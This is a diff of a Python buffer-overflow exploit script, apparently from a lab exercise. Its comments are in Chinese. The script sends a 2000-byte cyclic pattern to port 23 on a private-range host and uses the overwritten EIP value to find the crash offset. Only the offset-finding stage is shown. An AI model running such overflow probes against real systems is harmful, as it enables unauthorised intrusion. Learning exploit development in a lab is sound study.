@@ -3,14 +3,13 @@ from string import ascii_lowercase, digits
 import itertools
 
 # 目标主机Ip
-host_ip = '172.16.129.128'
+host_ip = '172.16.129.129'
 
 
 # 生成2000位不重复的测试字节串
 def generate_string():
     pattern = (''.join(map(''.join, itertools.product(ascii_lowercase, digits, digits))).encode())[:2000]
     return pattern
-
 
 # 发送函数
 def send_buf(buffer, host=host_ip, port=23):
@@ -23,7 +22,7 @@ def send_buf(buffer, host=host_ip, port=23):
 
 # 向目标主机发送测试字节串,用dd指令查看eip与esp的值
 s = generate_string()
-send_buf(s)
+# send_buf(s)
 
 # 通过dd eip查看eip值,转换成字节 b'37d3'
 eip_bytes = bytes.fromhex('33643733')[::-1]
